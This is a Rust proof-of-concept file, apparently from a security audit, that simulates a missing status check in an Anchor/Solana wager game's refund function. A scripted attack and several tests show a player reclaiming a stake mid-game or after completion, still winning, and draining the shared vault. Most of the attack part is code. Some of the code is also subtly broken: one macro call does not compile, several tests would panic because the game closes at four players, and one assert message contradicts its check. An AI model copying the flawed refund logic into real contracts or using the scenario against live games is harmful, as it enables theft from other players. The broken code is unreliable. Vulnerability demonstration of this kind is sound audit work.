// VUL-003: Multiple Refund Attack - Proof of Concept
// This PoC demonstrates how players can claim refunds from active/completed games

use anchor_lang::prelude::*;
use anchor_spl::token::{self, Token, TokenAccount, Transfer};
use std::collections::HashMap;

/// Game status enum matching the actual contract
#[derive(Debug, Clone, PartialEq)]
pub enum GameStatus {
    WaitingForPlayers,
    InProgress,
    Completed,
}

/// Simulates the vulnerable refund system
/// Based on actual code from refund_wager.rs:6-94
pub struct RefundAttackDemo {
    pub session_bet: u64,
    pub game_status: GameStatus,
    pub players: Vec<Pubkey>,
    pub vault_balance: u64,
    pub refunded_players: Vec<Pubkey>,
}

impl RefundAttackDemo {
    pub fn new(session_bet: u64) -> Self {
        Self {
            session_bet,
            game_status: GameStatus::WaitingForPlayers,
            players: Vec::new(),
            vault_balance: 0,
            refunded_players: Vec::new(),
        }
    }

    /// Simulates player joining game (based on join_user.rs)
    pub fn join_game(&mut self, player: Pubkey) -> Result<(), &'static str> {
        if self.game_status != GameStatus::WaitingForPlayers {
            return Err("Game not accepting players");
        }

        self.players.push(player);
        self.vault_balance += self.session_bet;

        println!("Player {} joined game for {} tokens",
                player.to_string()[..8].to_string(),
                self.session_bet / 1_000_000);
        println!("Vault balance: {} tokens", self.vault_balance / 1_000_000);

        // Auto-start game when enough players join
        if self.players.len() >= 4 {
            self.game_status = GameStatus::InProgress;
            println!("🎮 Game started! Status: InProgress");
        }

        Ok(())
    }

    /// Simulates game completion
    pub fn complete_game(&mut self) {
        if self.game_status == GameStatus::InProgress {
            self.game_status = GameStatus::Completed;
            println!("🏁 Game completed! Status: Completed");
        }
    }

    /// VULNERABLE REFUND FUNCTION
    /// Based on refund_wager.rs:6-94
    /// BUG: NO STATUS VALIDATION!
    pub fn refund_wager(&mut self, player: Pubkey) -> Result<u64, &'static str> {
        // MISSING: Status check that should be here!
        // The actual code has NO validation like this:
        // if self.game_status != GameStatus::WaitingForPlayers {
        //     return Err("Cannot refund after game starts");
        // }

        if !self.players.contains(&player) {
            return Err("Player not in game");
        }

        if self.refunded_players.contains(&player) {
            return Err("Player already refunded");
        }

        if self.vault_balance < self.session_bet {
            return Err("Insufficient vault balance");
        }

        // VULNERABLE: Refund regardless of game status!
        self.vault_balance -= self.session_bet;
        self.refunded_players.push(player);

        println!("💰 REFUND PROCESSED for {} during {:?} status!",
                player.to_string()[..8].to_string(),
                self.game_status);
        println!("Refunded: {} tokens", self.session_bet / 1_000_000);
        println!("Remaining vault: {} tokens", self.vault_balance / 1_000_000);

        Ok(self.session_bet)
    }

    /// Check if player can still participate after refund
    pub fn is_player_active(&self, player: Pubkey) -> bool {
        self.players.contains(&player) && !self.refunded_players.contains(&player)
    }

    /// Simulate winning the game
    pub fn player_wins(&self, player: Pubkey) -> Option<u64> {
        if self.players.contains(&player) {
            // Winner takes remaining vault (simplified)
            Some(self.vault_balance)
        } else {
            None
        }
    }

    /// Demonstrates the complete attack scenario
    pub fn run_attack_scenario(&mut self) {
        println!("\n🚨 VUL-003: Multiple Refund Attack PoC");
        println!("=".repeat(60));

        let attacker = Pubkey::new_unique();
        let victim1 = Pubkey::new_unique();
        let victim2 = Pubkey::new_unique();
        let victim3 = Pubkey::new_unique();

        println!("\n--- Phase 1: Game Setup ---");
        self.join_game(attacker).unwrap();
        self.join_game(victim1).unwrap();
        self.join_game(victim2).unwrap();
        self.join_game(victim3).unwrap();

        println!("Initial vault: {} tokens", self.vault_balance / 1_000_000);

        println!("\n--- Phase 2: Game Starts ---");
        println!("Game status: {:?}", self.game_status);
        println!("All players are now committed to the game...");

        println!("\n--- Phase 3: ATTACK - Refund During Active Game ---");
        match self.refund_wager(attacker) {
            Ok(refund_amount) => {
                println!("✅ ATTACK SUCCESSFUL!");
                println!("Attacker got {} tokens back while game is active!",
                        refund_amount / 1_000_000);

                // Check if attacker can still win
                if self.is_player_active(attacker) {
                    println!("🎯 BONUS: Attacker still listed as active player!");
                    println!("Can potentially win additional funds!");
                }
            },
            Err(e) => println!("❌ Attack failed: {}", e),
        }

        println!("\n--- Phase 4: Game Continues ---");
        println!("Other players continue playing normally...");
        println!("Vault now contains: {} tokens", self.vault_balance / 1_000_000);

        // Simulate attacker winning despite getting refund
        if let Some(winnings) = self.player_wins(attacker) {
            println!("\n💀 CRITICAL: Attacker wins game and gets additional {} tokens!",
                    winnings / 1_000_000);
            println!("Total attacker profit:");
            println!("- Refund: {} tokens", self.session_bet / 1_000_000);
            println!("- Winnings: {} tokens", winnings / 1_000_000);
            println!("- Net gain: {} tokens (should be 0!)",
                    (self.session_bet + winnings) / 1_000_000);
        }

        println!("\n--- Phase 5: Game Completion Attack ---");
        self.complete_game();
        println!("Game completed. Testing refund after completion...");

        // Try refunding another player after game completion
        match self.refund_wager(victim1) {
            Ok(refund_amount) => {
                println!("🚨 CRITICAL: Refund worked even after game completion!");
                println!("Victim1 got {} tokens back from completed game!",
                        refund_amount / 1_000_000);
            },
            Err(e) => println!("Refund after completion failed: {}", e),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_refund_during_active_game() {
        let session_bet = 100_000_000; // 100 tokens
        let mut game = RefundAttackDemo::new(session_bet);

        let attacker = Pubkey::new_unique();
        let other_players: Vec<Pubkey> = (0..3).map(|_| Pubkey::new_unique()).collect();

        // Setup game
        game.join_game(attacker).unwrap();
        for player in &other_players {
            game.join_game(*player).unwrap();
        }

        assert_eq!(game.game_status, GameStatus::InProgress);
        assert_eq!(game.vault_balance, 400_000_000); // 4 players × 100 tokens

        // ATTACK: Refund during active game
        let refund_result = game.refund_wager(attacker);
        assert!(refund_result.is_ok(), "Refund should succeed during active game");

        let refund_amount = refund_result.unwrap();
        assert_eq!(refund_amount, session_bet);
        assert_eq!(game.vault_balance, 300_000_000); // 400 - 100 = 300

        println!("✅ Vulnerability confirmed: Refund works during active game");
    }

    #[test]
    fn test_refund_after_completion() {
        let session_bet = 100_000_000; // 100 tokens
        let mut game = RefundAttackDemo::new(session_bet);

        let players: Vec<Pubkey> = (0..4).map(|_| Pubkey::new_unique()).collect();

        // Setup and complete game
        for player in &players {
            game.join_game(*player).unwrap();
        }
        game.complete_game();

        assert_eq!(game.game_status, GameStatus::Completed);

        // ATTACK: Refund after game completion
        let refund_result = game.refund_wager(players[0]);
        assert!(refund_result.is_ok(), "Refund should succeed even after completion");

        println!("✅ Vulnerability confirmed: Refund works after game completion");
    }

    #[test]
    fn test_double_spending_attack() {
        let session_bet = 100_000_000; // 100 tokens
        let mut game = RefundAttackDemo::new(session_bet);

        let attacker = Pubkey::new_unique();
        let victims: Vec<Pubkey> = (0..3).map(|_| Pubkey::new_unique()).collect();

        // Setup game
        game.join_game(attacker).unwrap();
        for victim in &victims {
            game.join_game(*victim).unwrap();
        }

        let initial_vault = game.vault_balance;

        // Attacker gets refund but stays in game
        game.refund_wager(attacker).unwrap();

        // Simulate attacker winning the remaining vault
        let winnings = game.player_wins(attacker).unwrap_or(0);

        let total_attacker_gain = session_bet + winnings; // Refund + winnings
        let expected_gain = 0; // Should be zero (paid to play, won back investment)

        println!("Initial investment: {} tokens", session_bet / 1_000_000);
        println!("Refund received: {} tokens", session_bet / 1_000_000);
        println!("Winnings: {} tokens", winnings / 1_000_000);
        println!("Total gain: {} tokens", total_attacker_gain / 1_000_000);
        println!("Expected gain: {} tokens", expected_gain / 1_000_000);

        assert!(total_attacker_gain > expected_gain, "Attacker should not profit from double-spending");

        println!("✅ Double-spending vulnerability confirmed");
    }

    #[test]
    fn test_vault_drainage() {
        let session_bet = 100_000_000; // 100 tokens
        let mut game = RefundAttackDemo::new(session_bet);

        let players: Vec<Pubkey> = (0..6).map(|_| Pubkey::new_unique()).collect();

        // Setup game with 6 players
        for player in &players {
            game.join_game(*player).unwrap();
        }

        let initial_vault = game.vault_balance;
        println!("Initial vault: {} tokens", initial_vault / 1_000_000);

        // Multiple players claim refunds during active game
        for (i, player) in players.iter().enumerate() {
            if i < 4 { // Refund 4 out of 6 players
                match game.refund_wager(*player) {
                    Ok(refund) => println!("Player {} refunded: {} tokens",
                            i + 1, refund / 1_000_000),
                    Err(e) => println!("Player {} refund failed: {}", i + 1, e),
                }
            }
        }

        println!("Final vault: {} tokens", game.vault_balance / 1_000_000);
        println!("Vault drained: {} tokens",
                (initial_vault - game.vault_balance) / 1_000_000);

        // Vault should be significantly drained
        assert!(game.vault_balance < initial_vault / 2, "Vault should be significantly drained");

        println!("✅ Vault drainage vulnerability confirmed");
    }
}

/// Integration tests simulating realistic attack scenarios
#[cfg(test)]
mod integration_tests {
    use super::*;

    #[test]
    fn test_realistic_tournament_attack() {
        println!("\n🏆 REALISTIC TOURNAMENT ATTACK SCENARIO");

        let session_bet = 250_000_000; // 250 tokens (high-stakes game)
        let mut tournament = RefundAttackDemo::new(session_bet);

        // High-value tournament with 8 players
        let legitimate_players: Vec<Pubkey> = (0..7).map(|_| Pubkey::new_unique()).collect();
        let attacker = Pubkey::new_unique();

        println!("Tournament entry fee: {} tokens", session_bet / 1_000_000);

        // All players join
        for (i, player) in legitimate_players.iter().enumerate() {
            tournament.join_game(*player).unwrap();
            println!("Legitimate player {} joined", i + 1);
        }
        tournament.join_game(attacker).unwrap();
        println!("Attacker joined");

        let total_prize_pool = tournament.vault_balance;
        println!("Total prize pool: {} tokens", total_prize_pool / 1_000_000);

        // Tournament starts
        println!("\n🎮 Tournament begins...");

        // Mid-tournament: Attacker realizes they're losing
        println!("\n💡 Attacker realizes they're losing...");
        println!("Executing refund attack...");

        match tournament.refund_wager(attacker) {
            Ok(refund) => {
                println!("✅ ATTACK SUCCESSFUL!");
                println!("Attacker recovered {} tokens (full entry fee)", refund / 1_000_000);
                println!("Remaining prize pool: {} tokens", tournament.vault_balance / 1_000_000);

                // Tournament continues with reduced prize pool
                println!("\n⚖️ IMPACT ASSESSMENT:");
                println!("- Legitimate players paid: 7 × {} = {} tokens",
                        session_bet / 1_000_000,
                        (7 * session_bet) / 1_000_000);
                println!("- Available prize pool: {} tokens",
                        tournament.vault_balance / 1_000_000);
                println!("- Shortfall: {} tokens",
                        ((7 * session_bet) - tournament.vault_balance) / 1_000_000);

                assert_eq!(tournament.vault_balance, 7 * session_bet);
                assert!(tournament.vault_balance < total_prize_pool);

                println!("💀 RESULT: Tournament prize pool illegitimately reduced!");
            },
            Err(e) => {
                println!("❌ Attack failed: {}", e);
                assert!(false, "Attack should have succeeded");
            }
        }
    }

    #[test]
    fn test_serial_refund_attacks() {
        println!("\n🔄 SERIAL REFUND ATTACK SCENARIO");

        let session_bet = 50_000_000; // 50 tokens

        // Simulate multiple games where attacker repeatedly exploits refunds
        for game_round in 1..=3 {
            println!("\n--- Game Round {} ---", game_round);

            let mut game = RefundAttackDemo::new(session_bet);
            let attacker = Pubkey::new_unique();
            let victims: Vec<Pubkey> = (0..5).map(|_| Pubkey::new_unique()).collect();

            // Setup game
            game.join_game(attacker).unwrap();
            for victim in &victims {
                game.join_game(*victim).unwrap();
            }

            println!("Game {} started with {} tokens prize pool",
                    game_round, game.vault_balance / 1_000_000);

            // Attacker always gets refund
            let refund = game.refund_wager(attacker).unwrap();
            println!("Attacker refunded: {} tokens", refund / 1_000_000);

            // Simulate game completion with reduced pool
            game.complete_game();
            println!("Game {} completed with {} tokens remaining",
                    game_round, game.vault_balance / 1_000_000);
        }

        println!("\n📊 SERIAL ATTACK IMPACT:");
        println!("Attacker successfully exploited {} games", 3);
        println!("Total refunds obtained: {} tokens", (3 * session_bet) / 1_000_000);
        println!("✅ Serial exploitation confirmed possible");
    }
}